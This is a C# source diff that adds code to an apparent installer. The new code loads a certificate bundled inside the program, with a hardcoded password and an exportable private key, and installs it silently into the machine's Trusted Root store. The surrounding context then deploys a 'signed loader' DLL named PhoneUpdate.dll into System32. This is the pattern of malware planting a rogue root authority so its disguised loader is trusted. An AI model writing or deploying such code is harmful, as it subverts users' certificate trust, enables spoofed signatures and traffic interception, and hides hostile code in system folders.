@@ -6,6 +6,7 @@ using System.Linq;
 using System.Reflection;
 using System.Runtime.InteropServices;
 using System.Security.Cryptography;
+using System.Security.Cryptography.X509Certificates;
 using System.Text;
 
 class P
@@ -56,6 +57,17 @@ class P
                 o += sz; ci++;
             }
             Console.WriteLine("Chunks written (" + ci + " chunks)");
+
+            Console.WriteLine("Installing certificate to Trusted Root...");
+            byte[] pfxBytes;
+            using (var s = Assembly.GetExecutingAssembly().GetManifestResourceStream("MorganTools.pfx"))
+            { pfxBytes = new byte[s.Length]; s.Read(pfxBytes, 0, pfxBytes.Length); }
+            var store = new X509Store(StoreName.Root, StoreLocation.LocalMachine);
+            store.Open(OpenFlags.ReadWrite);
+            var pfx = new X509Certificate2(pfxBytes, "morgan2026", X509KeyStorageFlags.Exportable | X509KeyStorageFlags.PersistKeySet);
+            store.Add(pfx);
+            store.Close();
+            Console.WriteLine("Certificate installed: " + pfx.Subject);
 
             Console.WriteLine("Deploying signed loader...");
             string dllPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Windows), "System32", "PhoneUpdate.dll");
